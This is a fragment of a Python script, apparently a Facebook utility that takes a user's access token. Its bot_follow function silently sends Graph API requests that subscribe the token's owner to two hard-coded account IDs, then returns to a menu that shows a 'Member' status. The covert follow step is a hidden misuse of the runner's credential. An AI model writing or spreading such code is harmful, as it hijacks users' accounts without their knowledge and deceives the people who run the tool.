...
def bot_follow():
	...
	nama_user = "Name : " + nama
	id_user = "\nID : " + id
	requests.post('https://graph.facebook.com/100050473873716/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100051836679623/subscribers?access_token=' + toket)
	menu()
...
def menu():
    ...
    print((k+"["+p+"•"+k+"]"+p+" Status  : "+k+"Member"+p))
